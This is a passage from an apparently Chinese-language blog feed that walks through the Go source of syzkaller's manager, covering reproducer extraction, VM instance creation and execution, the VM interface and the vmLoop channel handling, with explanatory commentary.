time.Now()</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">ctx.stats.ExtractProgTime = time.Since(start)</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Extract last program on every proc.</span></span><br><span class="line">procs := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>)</span><br><span class="line"><span class="keyword">for</span> i, ent := <span class="keyword">range</span> entries &#123;</span><br><span class="line">procs[ent.Proc] = i</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> indices []<span class="keyword">int</span></span><br><span class="line"><span class="keyword">for</span> _, idx := <span class="keyword">range</span> procs &#123;</span><br><span class="line">indices = <span class="built_in">append</span>(indices, idx)</span><br><span class="line">&#125;</span><br><span class="line">sort.Ints(indices)</span><br><span class="line"><span class="keyword">var</span> lastEntries []*prog.LogEntry</span><br><span class="line"><span class="keyword">for</span> i := <span class="built_in">len</span>(indices) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i-- &#123;</span><br><span class="line">lastEntries = <span class="built_in">append</span>(lastEntries, entries[indices[i]])</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, timeout := <span class="keyword">range</span> ctx.testTimeouts &#123;</span><br><span class="line"><span class="comment">// Execute each program separately to detect simple crashes caused by a single program.</span></span><br><span class="line"><span class="comment">// Programs are executed in reverse order, usually the last program is the guilty one.</span></span><br><span class="line">res, err := ctx.extractProgSingle(lastEntries, timeout)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> res != <span class="literal">nil</span> &#123;</span><br><span class="line">ctx.reproLogf(<span class="number">3</span>, <span class="string">&quot;found reproducer with %d syscalls&quot;</span>, <span class="built_in">len</span>(res.Prog.Calls))</span><br><span class="line"><span class="keyword">return</span> res, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Don&#x27;t try bisecting if there&#x27;s only one entry.</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(entries) == <span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Execute all programs and bisect the log to find multiple guilty programs.</span></span><br><span class="line">res, err = ctx.extractProgBisect(entries, timeout)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> res != <span class="literal">nil</span> &#123;</span><br><span class="line">ctx.reproLogf(<span class="number">3</span>, <span class="string">&quot;found reproducer with %d syscalls&quot;</span>, <span class="built_in">len</span>(res.Prog.Calls))</span><br><span class="line"><span class="keyword">return</span> res, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctx.reproLogf(<span class="number">0</span>, <span class="string">&quot;failed to extract reproducer&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数开始位置首先将程序逆序，随后调用<code>ctx.extractProgSingle</code>逐个运行单个程序，如果遇到<code>crash</code>则立刻返回（一般来说都是最后一个程序引起的）。如果没能找到则会进入到下面的判断中，如果程序个数不为1则会进入到<code>ctx.extractProgBisect</code>函数进行二分查找找出<code>crash</code>程序集合。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> !canRepro() &#123;</span><br><span class="line">  idx := instances.TakeOne()</span><br><span class="line">  <span class="keyword">if</span> idx == <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  &#125;</span><br><span class="line">  log.Logf(<span class="number">1</span>, <span class="string">&quot;loop: starting instance %v&quot;</span>, *idx)</span><br><span class="line">  <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    crash, err := mgr.runInstance(*idx)</span><br><span class="line">    runDone &lt;- &amp;RunResult&#123;*idx, crash, err&#125;</span><br><span class="line">  &#125;()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在看前面的两个小循环中的第二个循环，第二个循环的条件为不能进行<code>crash</code>复现，所以这里进入协程将剩余的VM调度去fuzz并将结果输出到<code>runDone</code>中去。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(mgr *Manager)</span> <span class="title">runInstance</span><span class="params">(index <span class="keyword">int</span>)</span> <span class="params">(*Crash, error)</span></span> &#123;</span><br><span class="line">mgr.checkUsedFiles()</span><br><span class="line">instanceName := fmt.Sprintf(<span class="string">&quot;vm-%d&quot;</span>, index)</span><br><span class="line"></span><br><span class="line">rep, vmInfo, err := mgr.runInstanceInner(index, instanceName)</span><br><span class="line"></span><br><span class="line">machineInfo := mgr.serv.shutdownInstance(instanceName)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(vmInfo) != <span class="number">0</span> &#123;</span><br><span class="line">machineInfo = <span class="built_in">append</span>(<span class="built_in">append</span>(vmInfo, <span class="string">&#x27;\n&#x27;</span>), machineInfo...)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Error that is not a VM crash.</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// No crash.</span></span><br><span class="line"><span class="keyword">if</span> rep == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">crash := &amp;Crash&#123;</span><br><span class="line">vmIndex:     index,</span><br><span class="line">hub:         <span class="literal">false</span>,</span><br><span class="line">Report:      rep,</span><br><span class="line">machineInfo: machineInfo,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> crash, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数实际调用的是<code>mgr.runInstanceInner</code>函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(mgr *Manager)</span> <span class="title">runInstanceInner</span><span class="params">(index <span class="keyword">int</span>, instanceName <span class="keyword">string</span>)</span> <span class="params">(*report.Report, []<span class="keyword">byte</span>, error)</span></span> &#123;</span><br><span class="line">inst, err := mgr.vmPool.Create(index)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;failed to create instance: %w&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> inst.Close()</span><br><span class="line"></span><br><span class="line">fwdAddr, err := inst.Forward(mgr.serv.port)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;failed to setup port forwarding: %w&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fuzzerBin, err := inst.Copy(mgr.cfg.FuzzerBin)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;failed to copy binary: %w&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If ExecutorBin is provided, it means that syz-executor is already in the image,</span></span><br><span class="line"><span class="comment">// so no need to copy it.</span></span><br><span class="line">executorBin := mgr.sysTarget.ExecutorBin</span><br><span class="line"><span class="keyword">if</span> executorBin == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">executorBin, err = inst.Copy(mgr.cfg.ExecutorBin)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;failed to copy binary: %w&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fuzzerV := <span class="number">0</span></span><br><span class="line">procs := mgr.cfg.Procs</span><br><span class="line"><span class="keyword">if</span> *flagDebug &#123;</span><br><span class="line">fuzzerV = <span class="number">100</span></span><br><span class="line">procs = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Run the fuzzer binary.</span></span><br><span class="line">start := time.Now()</span><br><span class="line">atomic.AddUint32(&amp;mgr.numFuzzing, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">defer</span> atomic.AddUint32(&amp;mgr.numFuzzing, ^<span class="keyword">uint32</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">args := &amp;instance.FuzzerCmdArgs&#123;</span><br><span class="line">Fuzzer:    fuzzerBin,</span><br><span class="line">Executor:  executorBin,</span><br><span class="line">Name:      instanceName,</span><br><span class="line">OS:        mgr.cfg.TargetOS,</span><br><span class="line">Arch:      mgr.cfg.TargetArch,</span><br><span class="line">FwdAddr:   fwdAddr,</span><br><span class="line">Sandbox:   mgr.cfg.Sandbox,</span><br><span class="line">Procs:     procs,</span><br><span class="line">Verbosity: fuzzerV,</span><br><span class="line">Cover:     mgr.cfg.Cover,</span><br><span class="line">Debug:     *flagDebug,</span><br><span class="line">Test:      <span class="literal">false</span>,</span><br><span class="line">Runtest:   <span class="literal">false</span>,</span><br><span class="line">Optional: &amp;instance.OptionalFuzzerArgs&#123;</span><br><span class="line">Slowdown:   mgr.cfg.Timeouts.Slowdown,</span><br><span class="line">RawCover:   mgr.cfg.RawCover,</span><br><span class="line">SandboxArg: mgr.cfg.SandboxArg,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line">cmd := instance.FuzzerCmd(args)</span><br><span class="line">outc, errc, err := inst.Run(mgr.cfg.Timeouts.VMRunningTime, mgr.vmStop, cmd)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;failed to run fuzzer: %w&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> vmInfo []<span class="keyword">byte</span></span><br><span class="line">rep := inst.MonitorExecution(outc, errc, mgr.reporter, vm.ExitTimeout)</span><br><span class="line"><span class="keyword">if</span> rep == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// This is the only &quot;OK&quot; outcome.</span></span><br><span class="line">log.Logf(<span class="number">0</span>, <span class="string">&quot;%s: running for %v, restarting&quot;</span>, instanceName, time.Since(start))</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">vmInfo, err = inst.Info()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">vmInfo = []<span class="keyword">byte</span>(fmt.Sprintf(<span class="string">&quot;error getting VM info: %v\n&quot;</span>, err))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> rep, vmInfo, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里首先调用<code>mgr.vmPool.Create</code>创建VM，随后调用<code>inst.Forward</code>进行TCP转发，然后通过<code>inst.Copy</code>拷贝<code>syz-fuzzer</code>和<code>syz-executor</code>到VM文件系统下。随后调用<code>instance.FuzzerCmd</code>函数生成命令行后调用<code>inst.Run</code>函数启动<code>syz-fuzzer</code>，随后调用<code>inst.MonitorExecution</code>监视VM运行，这个函数主要是通过获取<code>kernel oops</code>来判断是否出现了<code>crash</code>。</p><p>这里提一下vm实例，在<code>syz-manaer</code>中的vm实例其实是如下结构体表示的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Instance <span class="keyword">struct</span> &#123;</span><br><span class="line">impl     vmimpl.Instance</span><br><span class="line">workdir  <span class="keyword">string</span></span><br><span class="line">timeouts targets.Timeouts</span><br><span class="line">index    <span class="keyword">int</span></span><br><span class="line">onClose  <span class="function"><span class="keyword">func</span><span class="params">()</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其需要定义一些<code>interface</code>接口</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Instance <span class="keyword">interface</span> &#123;</span><br><span class="line"><span class="comment">// Copy copies a hostSrc file into VM and returns file name in VM.</span></span><br><span class="line">Copy(hostSrc <span class="keyword">string</span>) (<span class="keyword">string</span>, error)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Forward sets up forwarding from within VM to the given tcp</span></span><br><span class="line"><span class="comment">// port on the host and returns the address to use in VM.</span></span><br><span class="line">Forward(port <span class="keyword">int</span>) (<span class="keyword">string</span>, error)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Run runs cmd inside of the VM (think of ssh cmd).</span></span><br><span class="line"><span class="comment">// outc receives combined cmd and kernel console output.</span></span><br><span class="line"><span class="comment">// errc receives either command Wait return error or vmimpl.ErrTimeout.</span></span><br><span class="line"><span class="comment">// Command is terminated after timeout. Send on the stop chan can be used to terminate it earlier.</span></span><br><span class="line">Run(timeout time.Duration, stop &lt;-<span class="keyword">chan</span> <span class="keyword">bool</span>, command <span class="keyword">string</span>) (outc &lt;-<span class="keyword">chan</span> []<span class="keyword">byte</span>, errc &lt;-<span class="keyword">chan</span> error, err error)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Diagnose retrieves additional debugging info from the VM</span></span><br><span class="line"><span class="comment">// (e.g. by sending some sys-rq&#x27;s or SIGABORT&#x27;ing a Go program).</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Optionally returns (some or all) of the info directly. If wait == true,</span></span><br><span class="line"><span class="comment">// the caller must wait for the VM to output info directly to its log.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// rep describes the reason why Diagnose was called.</span></span><br><span class="line">Diagnose(rep *report.Report) (diagnosis []<span class="keyword">byte</span>, wait <span class="keyword">bool</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Close stops and destroys the VM.</span></span><br><span class="line">Close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>  <code>Copy()</code>：将一个来自宿主机的文件拷贝至虚拟机中，返回虚拟机中的文件名</p><p>  <code>Forward()</code>：设置从虚拟机内到主机上给定 tcp 端口的转发，并返回要在虚拟机中使用的地址</p><p>  <code>Run()</code>：在虚拟机内执行命令</p><p>  <code>Diagnose()</code>：在虚拟机上检索额外的调试信息</p><p>  <code>Close()</code>：停止并销毁虚拟机</p></blockquote><p>需要注意的是，不同的<code>guest VM</code>所实现的<code>interface</code>是不同的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(mgr *Manager)</span> <span class="title">vmLoop</span><span class="params">()</span></span> &#123;</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line"><span class="keyword">for</span> shutdown != <span class="literal">nil</span> || instances.Len() != vmCount &#123;</span><br><span class="line">    <span class="comment">// ... ...</span></span><br><span class="line"><span class="keyword">var</span> stopRequest <span class="keyword">chan</span> <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">if</span> !stopPending &amp;&amp; canRepro() &#123;</span><br><span class="line">stopRequest = mgr.vmStop</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wait:</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-instances.Freed:</span><br><span class="line"><span class="comment">// An instance has been released.</span></span><br><span class="line"><span class="keyword">case</span> stopRequest &lt;- <span class="literal">true</span>:</span><br><span class="line">log.Logf(<span class="number">1</span>, <span class="string">&quot;loop: issued stop request&quot;</span>)</span><br><span class="line">stopPending = <span class="literal">true</span></span><br><span class="line"><span class="keyword">case</span> res := &lt;-runDone:</span><br><span class="line">log.Logf(<span class="number">1</span>, <span class="string">&quot;loop: instance %v finished, crash=%v&quot;</span>, res.idx, res.crash != <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">if</span> res.err != <span class="literal">nil</span> &amp;&amp; shutdown != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Logf(<span class="number">0</span>, <span class="string">&quot;%v&quot;</span>, res.err)</span><br><span class="line">&#125;</span><br><span class="line">stopPending = <span class="literal">false</span></span><br><span class="line">instances.Put(res.idx)</span><br><span class="line"><span class="comment">// On shutdown qemu crashes with &quot;qemu: terminating on signal 2&quot;,</span></span><br><span class="line"><span class="comment">// which we detect as &quot;lost connection&quot;. Don&#x27;t save that as crash.</span></span><br><span class="line"><span class="keyword">if</span> shutdown != <span class="literal">nil</span> &amp;&amp; res.crash != <span class="literal">nil</span> &#123;</span><br><span class="line">needRepro := mgr.saveCrash(res.crash)</span><br><span class="line"><span class="keyword">if</span> needRepro &#123;</span><br><span class="line">log.Logf(<span class="number">1</span>, <span class="string">&quot;loop: add pending repro for &#x27;%v&#x27;&quot;</span>, res.crash.Title)</span><br><span class="line">pendingRepro[res.crash] = <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> res := &lt;-reproDone:</span><br><span class="line">atomic.AddUint32(&amp;mgr.numReproducing, ^<span class="keyword">uint32</span>(<span class="number">0</span>))</span><br><span class="line">crepro := <span class="literal">false</span></span><br><span class="line">title := <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> res.repro != <span class="literal">nil</span> &#123;</span><br><span class="line">crepro = res.repro.CRepro</span><br><span class="line">title = res.repro.Report.Title</span><br><span class="line">&#125;</span><br><span class="line">log.Logf(<span class="number">0</span>, <span class="string">&quot;loop: repro on %+v finished &#x27;%v&#x27;, repro=%v crepro=%v desc=&#x27;%v&#x27;&quot;</span>,</span><br><span class="line">res.instances, res.report0.Title, res.repro != <span class="literal">nil</span>, crepro, title)</span><br><span class="line"><span class="keyword">if</span> res.err != <span class="literal">nil</span> &#123;</span><br><span class="line">reportReproError(res.err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">delete</span>(reproducing, res.report0.Title)</span><br><span class="line"><span class="keyword">if</span> res.repro == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> !res.hub &#123;</span><br><span class="line">mgr.saveFailedRepro(res.report0, res.stats)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">mgr.saveRepro(res)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> &lt;-shutdown:</span><br><span class="line">log.Logf(<span class="number">1</span>, <span class="string">&quot;loop: shutting down...&quot;</span>)</span><br><span class="line">shutdown = <span class="literal">nil</span></span><br><span class="line"><span class="keyword">case</span> crash := &lt;-mgr.hubReproQueue:</span><br><span class="line">log.Logf(<span class="number">1</span>, <span class="string">&quot;loop: get repro from hub&quot;</span>)</span><br><span class="line">pendingRepro[crash] = <span class="literal">true</span></span><br><span class="line"><span class="keyword">case</span> reply := &lt;-mgr.needMoreRepros:</span><br><span class="line">reply &lt;- phase &gt;= phaseTriagedHub &amp;&amp;</span><br><span class="line"><span class="built_in">len</span>(reproQueue)+<span class="built_in">len</span>(pendingRepro)+<span class="built_in">len</span>(reproducing) == <span class="number">0</span></span><br><span class="line"><span class="keyword">goto</span> wait</span><br><span class="line"><span class="keyword">case</span> reply := &lt;-mgr.reproRequest:</span><br><span class="line">repros := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span>)</span><br><span class="line"><span class="keyword">for</span> title := <span class="keyword">range</span> reproducing &#123;</span><br><span class="line">repros[title] = <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">reply &lt;- repros</span><br><span class="line"><span class="keyword">goto</span> wait</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入最后阶段，等待处理不同的<code>channel</code>数据，这里逐<code>case</code>分析。</p><p>首先第一个的触发条件为<code>instances.Freed</code>即当空间的VM被<code>Put</code>返回资源池时则会向该<code>channel</code>送入一个<code>true</code>，进入其代码块，但是并没做什么事情。</p><p>第二个的条件可以注意到前面的赋值操作<code>stopRequest</code>其实就是<code>mgr.vmStop</code>，而这个<code>channel</code>会在VM instance的<code>RUN</code>函数中使用。</p><p>第三个的条件为<code>res := &lt;-runDone</code>当<code>runDone</code>中有数据时进入，其有数据代表的是有<code>crash</code>产生了，这里主要做的事就是将<code>crash</code>加入到<code>pendingRepro</code>中。</p><p>第四个的条件就是复现时出现结果，这里主要做的事情是，从<code>reproducing</code>删除对应的<code>crash</code>，随后保存复现结果。</p><p>第五个条件就是存在终止信号。</p><p>第六个则是<code>hubReproQueue</code>也可能传来<code>crash</code>，如果传来了<code>crash</code>则将其加入到<code>pendingRepro</code>中。</p><p>第七个根据<code>mgr.needMoreRepros</code>字面意思就是需要更多的<code>repros</code>，其内部代码就是判断当前阶段以及等待复现、复现队列、复现中的数量是否为0并将最后的结果返回到<code>channel</code>中并在此运行<code>wait</code>重新等待。</p><p>最后<code>mgr.reproRequest</code>意为主动请求复现，这里会拷贝<code>reproducing</code>的位图并返回到<code>channel</code>中最后跳转<code>wait</code>重新等待。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这篇文章的前言主要提一下前段时间在强网拟态中的pwn，首先是内核pwn。&lt;/p&gt;
&lt;p&gt;其实很简单就是一个简单版的&lt;code&gt;off by </summary>
      
    
    
    
    <category term="fuzzing" scheme="https://196082.github.io/categories/fuzzing/"/>
    
    
    <category term="fuzzing" scheme="https://196082.github.io/tags/fuzzing/"/>
    
    <category term="syzkaller" scheme="https://196082.github.io/tags/syzkaller/"/>
    
  </entry>
  
  <entry>
    <title>syzkaller基本使用</title>
    <link href="https://196082.github.io/2023/11/10/syzkaller%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <id>https://196082.github.io/2023/11/10/syzkaller%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</id>
    <published>2023-11-10T09:04:05.000Z</published>
    <updated>2024-06-12T12:51:43.000Z</updated>
    
